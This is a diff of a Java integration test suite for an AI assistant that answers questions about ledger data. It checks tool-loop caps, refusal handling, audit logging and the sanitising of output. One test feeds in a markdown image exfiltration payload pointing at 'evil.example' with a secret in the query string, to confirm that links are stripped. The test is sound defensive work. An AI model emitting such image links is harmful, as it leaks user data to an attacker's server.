@@ -87,7 +87,10 @@ class AssistantTest extends IntegrationTestBase {
         var results = CLAUDE.toolResults(1);
         assertThat(results).hasSize(1);
         assertThat(results.get(0).get("tool_use_id").asText()).isEqualTo("toolu_1");
-        assertThat(results.get(0).get("content").asText()).contains(alice.toString()).contains("\"balance\":\"74.50\"");
+        String content = results.get(0).get("content").asText();
+        assertThat(content).startsWith("{\"untrusted_data\":").contains(alice.toString())
+                .contains("\"balance\":\"74.50\"");
+        assertThat(CLAUDE.requests.get(1).has("tool_choice")).as("tools stay on before the last round").isFalse();
     }
 
     @Test
@@ -141,13 +144,62 @@ class AssistantTest extends IntegrationTestBase {
     }
 
     @Test
-    void toolLoopIsCapped() throws Exception {
+    void toolLoopIsCappedAndToolsAreSwitchedOffOnTheLastRound() throws Exception {
         CLAUDE.repeatForever = FakeClaude.toolUse("toolu_x", "ledger_integrity", "{}");
         ask(tenant, "Keep checking forever")
                 .andExpect(status().isOk())
                 .andExpect(jsonPath("$.complete").value(false))
-                .andExpect(jsonPath("$.rounds").value(3));
+                .andExpect(jsonPath("$.rounds").value(3))
+                .andExpect(jsonPath("$.toolsUsed.length()").value(2)); // last-round request is not run
         assertThat(CLAUDE.requests).hasSize(3);
+        assertThat(CLAUDE.requests.get(2).path("tool_choice").path("type").asText()).isEqualTo("none");
+    }
+
+    @Test
+    void truncatedOrRefusedAnswersAreMarkedIncomplete() throws Exception {
+        CLAUDE.then(FakeClaude.stop("max_tokens", "You have three acc"));
+        ask(tenant, "Long question").andExpect(status().isOk())
+                .andExpect(jsonPath("$.complete").value(false))
+                .andExpect(jsonPath("$.answer", org.hamcrest.Matchers.containsString("cut short")));
+
+        CLAUDE.then(FakeClaude.stop("refusal", ""));
+        ask(tenant, "Something odd").andExpect(status().isOk())
+                .andExpect(jsonPath("$.complete").value(false))
+                .andExpect(jsonPath("$.answer").value("The assistant declined to answer that question."));
+    }
+
+    @Test
+    void failedQuestionsAreStillAudited() throws Exception {
+        CLAUDE.then(FakeClaude.toolUse("toolu_1", "list_accounts", "{}"));
+        CLAUDE.then("STATUS:529"); // ledger data already sent in round 1, then Claude fails
+        ask(tenant, "How many accounts?")
+                .andExpect(status().isServiceUnavailable())
+                .andExpect(jsonPath("$.code").value("ASSISTANT_UNAVAILABLE"));
+
+        String payload = jdbc.queryForObject(
+                "select payload from audit_events where tenant_id = ? and event_type = 'ASSISTANT_QUERY'",
+                String.class, tenant.id());
+        assertThat(payload).contains("outcome=error:ASSISTANT_UNAVAILABLE").contains("tools=list_accounts");
+    }
+
+    @Test
+    void parallelToolCallsPerRoundAreCapped() throws Exception {
+        CLAUDE.then(FakeClaude.parallelToolUses("list_accounts", 6));
+        CLAUDE.then(FakeClaude.text("ok"));
+        ask(tenant, "Everything at once").andExpect(status().isOk())
+                .andExpect(jsonPath("$.toolsUsed.length()").value(AssistantService.MAX_TOOL_CALLS_PER_ROUND));
+        var results = CLAUDE.toolResults(1);
+        assertThat(results).hasSize(6); // every tool_use gets a tool_result, as the API requires
+        assertThat(results.get(5).get("is_error").asBoolean()).isTrue();
+        assertThat(results.get(5).get("content").asText()).contains("Too many tool calls");
+    }
+
+    @Test
+    void linksAndImagesAreRemovedFromAnswers() throws Exception {
+        CLAUDE.then(FakeClaude.text("Done ![chart](https://evil.example/c?d=SECRET) see https://evil.example/x"));
+        ask(tenant, "Summarise").andExpect(status().isOk())
+                .andExpect(jsonPath("$.answer", org.hamcrest.Matchers.not(org.hamcrest.Matchers.containsString("evil"))))
+                .andExpect(jsonPath("$.answer", org.hamcrest.Matchers.containsString("chart")));
     }
 
     @Test
@@ -159,7 +211,8 @@ class AssistantTest extends IntegrationTestBase {
         String payload = jdbc.queryForObject(
                 "select payload from audit_events where tenant_id = ? and event_type = 'ASSISTANT_QUERY'",
                 String.class, tenant.id());
-        assertThat(payload).contains("tools=ledger_integrity").contains("question=Are my books healthy?");
+        assertThat(payload).contains("outcome=complete").contains("tools=ledger_integrity")
+                .contains("input_tokens=20").contains("question=Are my books healthy?");
         assertThat(integrity(tenant).get("auditChainValid").asBoolean()).isTrue();
     }
 
